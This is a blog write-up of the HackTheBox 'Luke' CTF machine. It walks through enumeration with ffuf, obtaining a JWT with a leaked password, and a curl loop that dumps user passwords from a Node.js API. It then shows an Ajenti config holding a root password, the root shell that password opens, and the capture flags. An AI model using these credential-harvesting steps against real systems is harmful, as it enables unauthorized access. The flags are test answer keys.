---
title: "Luke - HackTheBox"
date: 2019-07-27T17:39:53+02:00
type: post
tags:
    - "HackTheBox"
    - "CTF"
---
![Information](/images/hackthebox/luke/info.png)

---
### Information gathering

Let's start with the usual information gathering steps:

![Port scan](/images/hackthebox/luke/nmap.png)

There's a FTP server on port 21, let's check what's on it:
![FTP](/images/hackthebox/luke/ftp.png)

In the webapp folder there's a txt file:
![Text file](/images/hackthebox/luke/txt.png)

Let's see what's on the web server on port 80:
![Web](/images/hackthebox/luke/web.png)

Navigating through the website and checking the sources we do not find anything
useful.

Let's run [ffuf](https://github.com/ffuf/ffuf) to search directories and files:
```
$ ffuf -w raft-large-directories.txt -r -u http://10.10.10.137/FUZZ 
$ ffuf -w raft-large-files.txt -r -u http://10.10.10.137/FUZZ 
```

I'm using two wordlists, one for directories and one for files. They both are
from the [SecLists](https://github.com/danielmiessler/SecLists) repository:
![Ffuf directories](/images/hackthebox/luke/ffuf.png)
![Ffuf files](/images/hackthebox/luke/ffuf2.png)

In the `/management` directory there's a login made with HTTP basic
authentication:
![Management](/images/hackthebox/luke/management.png)

In the `login.php` page there a login form:
![Login](/images/hackthebox/luke/login.png)

Trying [hydra](https://github.com/vanhauser-thc/thc-hydra) on all of them gives
us no results.

The `config.php` file contains something interesting:
![Config](/images/hackthebox/luke/config.php.png)

Let's check the web server on port 3000:
![NodeJS](/images/hackthebox/luke/nodejs.png)

Searching the error message on Google, we find that the token must be provided
in the `GET` request using the `X-Access-Token` header. Let's fire up Burp and
try:
![Token](/images/hackthebox/luke/token.png)

It's getting recognized, but, obviously, it's not a valid token. After a bit of
googling we find that to authenticate using JWT Tokens we must make a `POST`
request to a certain url with the username and password.

You can find an explanation about JWT [here](https://medium.com/swlh/a-practical-guide-for-jwt-authentication-using-nodejs-and-express-d48369e7e6d4).

Let's search any valid path on port 3000:
![Ffuf 3000](/images/hackthebox/luke/ffuf-3000.png)

Let's use wfuzz with the password found in `config.php` with a list of usernames
to try to get a token:
![Wfuzz JWT](/images/hackthebox/luke/wfuzz-jwt.png)

We see that the username admin gives us a `200` response code. Let's make the
request with `curl` to see the result:
![Token](/images/hackthebox/luke/curl-token.png)

Now we can use the token to authenticate by sending it in the `X-Access-Token`
header in our requests.

Let's try to use it to access the previous found directory:
![Users JWT](/images/hackthebox/luke/jwt-users.png)

By trying to do the same request to `/users/admin`, I got the admin password, so
because I like to automate things, I wrote a script that makes a request for
every user
```bash
#!/bin/bash

declare -a users=("admin" "derry" "yuri" "dory")

for user in "${users[@]}"; do
    curl -s -X GET -H "X-Access-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTY0NTk2MTIyLCJleHAiOjE1NjQ2ODI1MjJ9.QKBqdc7fAcMY7dVB-ruizMdmcUNm3KheoX1kwSuB68k" http://10.10.10.137:3000/users/$user | jq
done
```
![Passwords JWT](/images/hackthebox/luke/jwt-passwords.png)

`jq` is used to beautify the `JSON`.

By trying the credentials in the logins founds previously, we get access to the
`/management` endpoint with the user Derry:
![Management login](/images/hackthebox/luke/management-login.png)

The only interesting file is `config.json`:
```json
{
    "users": {
        "root": {
            "configs": {
                "ajenti.plugins.notepad.notepad.Notepad": "{\"bookmarks\": [], \"root\": \"/\"}", 
                "ajenti.plugins.terminal.main.Terminals": "{\"shell\": \"sh -c $SHELL || sh\"}", 
                "ajenti.plugins.elements.ipmap.ElementsIPMapper": "{\"users\": {}}", 
                "ajenti.plugins.munin.client.MuninClient": "{\"username\": \"username\", \"prefix\": \"http://localhost:8080/munin\", \"password\": \"123\"}", 
                "ajenti.plugins.dashboard.dash.Dash": "{\"widgets\": [{\"index\": 0, \"config\": null, \"container\": \"1\", \"class\": \"ajenti.plugins.sensors.memory.MemoryWidget\"}, {\"index\": 1, \"config\": null, \"container\": \"1\", \"class\": \"ajenti.plugins.sensors.memory.SwapWidget\"}, {\"index\": 2, \"config\": null, \"container\": \"1\", \"class\": \"ajenti.plugins.dashboard.welcome.WelcomeWidget\"}, {\"index\": 0, \"config\": null, \"container\": \"0\", \"class\": \"ajenti.plugins.sensors.uptime.UptimeWidget\"}, {\"index\": 1, \"config\": null, \"container\": \"0\", \"class\": \"ajenti.plugins.power.power.PowerWidget\"}, {\"index\": 2, \"config\": null, \"container\": \"0\", \"class\": \"ajenti.plugins.sensors.cpu.CPUWidget\"}]}", 
                "ajenti.plugins.elements.shaper.main.Shaper": "{\"rules\": []}", 
                "ajenti.plugins.ajenti_org.main.AjentiOrgReporter": "{\"key\": null}", 
                "ajenti.plugins.logs.main.Logs": "{\"root\": \"/var/log\"}", 
                "ajenti.plugins.mysql.api.MySQLDB": "{\"password\": \"\", \"user\": \"root\", \"hostname\": \"localhost\"}", 
                "ajenti.plugins.fm.fm.FileManager": "{\"root\": \"/\"}", 
                "ajenti.plugins.tasks.manager.TaskManager": "{\"task_definitions\": []}", 
                "ajenti.users.UserManager": "{\"sync-provider\": \"\"}", 
                "ajenti.usersync.adsync.ActiveDirectorySyncProvider": "{\"domain\": \"DOMAIN\", \"password\": \"\", \"user\": \"Administrator\", \"base\": \"cn=Users,dc=DOMAIN\", \"address\": \"localhost\"}", 
                "ajenti.plugins.elements.usermgr.ElementsUserManager": "{\"groups\": []}", 
                "ajenti.plugins.elements.projects.main.ElementsProjectManager": "{\"projects\": \"KGxwMQou\\n\"}"
            }, 
            "password": "KpMasng6S5EtTy9Z", 
            "permissions": []
        }
    }, 
    "language": "", 
    "bind": {
        "host": "0.0.0.0", 
        "port": 8000
    }, 
    "enable_feedback": true, 
    "ssl": {
        "enable": false, 
        "certificate_path": ""
    }, 
    "authentication": true, 
    "installation_id": 12354
    }
```

We find the username and password (root:KpMasng6S5EtTy9Z) for the Ajenti panel
running on port `8000`. This is the administration panel:
![Ajenti](/images/hackthebox/luke/ajenti.png)

On the left, in the terminal section, we have access to a shell:
![Root](/images/hackthebox/luke/root.png)

To my surprise, this is a root shell, so during my workflow I must have skipped
some steps.

### User flag
```
58d441e500e8941f9cf3baa499e2e4da
```
### Root flag
```
8448343028fadde1e2a1b0a44d01e650
```
